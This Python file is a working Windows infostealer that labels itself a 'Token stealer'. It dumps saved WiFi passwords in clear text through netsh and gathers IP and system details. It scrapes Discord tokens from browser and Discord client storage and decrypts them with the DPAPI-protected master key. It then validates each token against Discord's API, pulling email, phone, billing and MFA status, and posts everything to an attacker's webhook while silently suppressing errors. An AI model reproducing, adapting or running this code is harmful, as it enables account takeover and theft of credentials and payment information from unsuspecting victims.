import os
import re
import json
import base64
import psutil
import classes
import requests
import platform
import subprocess
from classes.config import Config
from classes.token import Token
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from concurrent.futures import ThreadPoolExecutor

regexp = '[\\w-]{26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
regexp_enc = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'
roaming = os.getenv('appdata', '')

class SystemInfo:
    @staticmethod
    def run():
        def ip():
            try:
                res = requests.get('https://api.ipify.org?format=json')
                return res.json().get('ip', 'N/A')
            except requests.RequestException:
                return 'N/A'

        def passwords():
            pwds = []
            try:
                res = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
                progs = [line.split(":")[1].strip() for line in res.stdout.split('\n') if "All User Profile" in line]

                for prog in progs:
                    res = subprocess.run(['netsh', 'wlan', 'show', 'profile', prog, 'key=clear'], capture_output=True, text=True)
                    keys = [line for line in res.stdout.split('\n') if "Key Content" in line]
                    if keys:
                        pwd = keys[0].split(":")[1].strip()
                        pwds.append(f"**{prog}**: {pwd}")
                    else:
                        pwds.append(f"**{prog}**: No password")
            except Exception:
                pwds.append("⚠️ Error retrieving WiFi passwords")

            return pwds

        info = {
            "🌐 IP": ip(),
            "🖥️ Name": platform.node(),
            "😤 CPU": platform.processor(),
            "🗄️ RAM": f"{psutil.virtual_memory().total // (1024 ** 3)} GB",
            "🖥️ OS": platform.system() + " " + platform.release(),
            "📶 WiFi": "\n".join(passwords())
        }

        embed = {
            "title": "🖥️ **System Information**",
            "fields": [{"name": k, "value": v, "inline": False} for k, v in info.items()]
        }
        payload = {"content": "||@everyone||", "embeds": [embed], "footer": "Token logger | https://discord.gg/pop"}
        res = requests.post(webhook, json=payload)
        if res.status_code == 204:
            pass
        else:
            pass

class DiscordTokens:
    @staticmethod
    def search_tks() -> list:
        try:
            tks = []
            tks.extend(DiscordTokens.search_firefox_tks())
            tks.extend(DiscordTokens.search_ch_d__tks())
            return tks
        except Exception:
            return []

    @staticmethod
    def search_firefox_tks() -> list:
        tks = []
        try:
            firefox_profile_path = os.path.join(roaming, 'Mozilla\\Firefox\\Profiles')
            if os.path.exists(firefox_profile_path):
                for path, _, files in os.walk(firefox_profile_path):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(os.path.join(path, _file), 'r', errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(regexp, line):
                                tks.append(token)
        except Exception:
            pass
        return tks

    @staticmethod
    def search_ch_d__tks() -> list:
        tks = []
        try:
            ch_based_browser_paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': os.getenv('LOCALAPPDATA', '') + '\\Opera Software\\Opera Stable',
                'Opera GX': os.getenv('LOCALAPPDATA', '') + '\\Opera Software\\Opera GX Stable',
                'Chrome': os.getenv('LOCALAPPDATA', '') + '\\Google\\Chrome\\User Data\\Default'
            }
            for name, path in ch_based_browser_paths.items():
                path = os.path.join(path, 'Local Storage', 'leveldb')
                if not os.path.exists(path):
                    continue
                disc = name.replace(' ', '').lower()
                if 'cord' in path:
                    local_state_path = os.path.join(roaming, f'{disc}\\Local State')
                    if os.path.exists(local_state_path):
                        for file_name in os.listdir(path):
                            if file_name[-3:] not in ['log', 'ldb']:
                                continue
                            for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                                for y in re.findall(regexp_enc, line):
                                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(local_state_path))
                                    tks.append(token)
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                            for token in re.findall(regexp, line):
                                tks.append(token)
        except Exception:
            pass
        return tks

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return 'Failed to decrypt password'

def get_master_key(path):
    try:
        if not os.path.exists(path):
            return None
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return None
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def st(tokens):
    for token in tokens:
        headers = {
                    'authority': 'discord.com',
                    'accept': '*/*',
                    'accept-language': 'fr-FR,fr;q=0.9',
                    'authorization': token,
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    'cookie': '__dcfduid=d9300cb25a2d11efbae80af27259f8b7; __sdcfduid=d9300cb25a2d11efbae80af27259f8b76a5e4150c23d0ecba15974996910f17ae942b1a00d50464d1fa8395f5d2d07de; __cfruid=None; locale=en-US',
                    'origin': 'https://discord.com',
                    'pragma': 'no-cache',
                    'referer': 'https://discord.com/channels/@me',
                    'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-super-properties': 'eyJvcyI6ICJXaW5kb3dzIiwgImJyb3dzZXIiOiAiT3BlcmEiLCAiZGV2aWNlIjogIiIsICJzeXN0ZW1fbG9jYWxlIjogImVuLUpNIiwgImJyb3dzZXJfdXNlcl9hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84NC4wLjQxNDcuMTI1IFNhZmFyaS81MzcuMzYiLCAiYnJvd3Nlcl92ZXJzaW9uIjogIiIsICJvc192ZXJzaW9uIjogIiIsICJyZWZlcnJlciI6ICIiLCAicmVmZXJyaW5nX2RvbWFpbiI6ICIiLCAicmVmZXJyZXJfY3VycmVudCI6ICIiLCAicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjogIiIsICJyZWxlYXNlX2NoYW5uZWwiOiAic3RhYmxlIiwgImNsaWVudF9idWlsZF9udW1iZXIiOiAxODE4MzIsICJjbGllbnRfZXZlbnRfc291cmNlIjogIm51bGwifQ=='
        }
        token_obj = Token(token)
        token_obj.check(headers, requests.Session())
        if token_obj.status == "valid":
            embed = {
                "title": ":white_check_mark: **Discord Token**",
                "fields": [
                    {"name": "Token", "value": f"`{token}`", "inline": False},
                    {"name": "Status", "value": f"`{token_obj.status}`", "inline": True},
                    {"name": "Name", "value": f"`{token_obj.name}`", "inline": True},
                    {"name": "Avatar", "value": f"[Avatar]({token_obj.avatar})", "inline": True},
                    {"name": "Email", "value": f"`{token_obj.email}`", "inline": True},
                    {"name": "Phone", "value": f"`{token_obj.phone}`", "inline": True},
                    {"name": "Creation Date", "value": f"`{token_obj.creation}`", "inline": True},
                    {"name": "Verified", "value": f"`{token_obj.verified}`", "inline": True},
                    {"name": "MFA Enabled", "value": f"`{token_obj.mfa}`", "inline": True},
                    {"name": "Flags", "value": f"`{token_obj.flags}`", "inline": True},
                    {"name": "Locale", "value": f"`{token_obj.lang}`", "inline": True},
                    {"name": "Age", "value": f"`{token_obj.age}`", "inline": True},
                    {"name": "Nitro", "value": f"`{token_obj.nitro}`", "inline": True},
                    {"name": "Boosts", "value": f"`{token_obj.boosts}`", "inline": True},
                    {"name": "Expiry", "value": f"`{token_obj.expires}`", "inline": True},
                    {"name": "Billing", "value": f"`{', '.join(token_obj.billing)}`", "inline": True},
                    {"name": "Type", "value": f"`{token_obj.type}`", "inline": True},
                    {"name": "Guilds", "value": f"`{token_obj.guilds}`", "inline": True},
                    {"name": "Ev", "value": f"`{token_obj.ev}`", "inline": True},
                    {"name": "Pv", "value": f"`{token_obj.pv}`", "inline": True},
                    {"name": "Fv", "value": f"`{token_obj.fv}`", "inline": True}
                ],
                "color": 5814783,
                "footer": {
                    "text": "Token stealer | https://discord.gg/pop",
                }
            }
        else:
            embed = {
            "title": ":x: **Discord Token** (INVALID)",
            "fields": [
                {"name": "Token", "value": f"`{token}`", "inline": False},
            ],
            "footer": {
                "text": "Token stealer | https://discord.gg/pop",
            },
            "color": 16711680
        }
        payload = {"content": "||@everyone||", "embeds": [embed]}
        res = requests.post(webhook, json=payload, headers={'Content-Type': 'application/json'})
        if res.status_code == 204:
            pass
        else:
            pass

if __name__ == "__main__":
    webhook = Config.webhook
    try:
        SystemInfo.run()
    except:
        pass
    try:
        tokens = DiscordTokens().search_tks()
        st(tokens)
    except:
        pass
